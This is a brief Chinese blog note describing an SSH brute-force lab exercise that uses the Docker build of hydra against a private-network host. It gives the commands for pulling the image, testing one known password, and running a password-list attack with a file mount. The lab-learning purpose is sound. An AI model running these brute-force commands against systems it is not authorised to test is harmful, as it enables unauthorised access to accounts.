最近做ssh暴力破解实验，由于服务器上面软件依赖太乱了，导致我花了好久没能成功编译出hydra，于是想到了使用docker版本的hydra，最后成功的完成了ssh暴力破解实验～

### 1、docker下载暴力破解工具hydra

```
docker pull vanhauser/hydra
```

![](/notes-assets/2b2f84b00d8387252eab.webp)

### 2、使用单个已知密码验证认证；这不是完整的密码字典测试。

```
docker run vanhauser/hydra -l ailx10 -p h3ll0 ssh://192.168.0.108
```

![](/notes-assets/21a82387a88d1597fbd3.webp)

### 3、密码本暴力破解尝试

重点来了，注意这里需要做一下文件映射，要不然找不到密码本文件

```
docker run -v /home/ailx10/pass.txt:/home/ailx10/pass.txt vanhauser/hydra  -l ailx10 -P /home/ailx10/pass.txt ssh://192.168.0.108
```

![](/notes-assets/005060aa497115d58c47.webp)

本次使用的 Docker 镜像未支持 RDP；这不代表所有 Hydra 构建均不支持该协议。

容器里缺某个协议支持，是这份镜像的能力边界，不代表工具所有版本都如此。成功记录也要分清是验证已知口令，还是从候选集合里找到了匹配值。
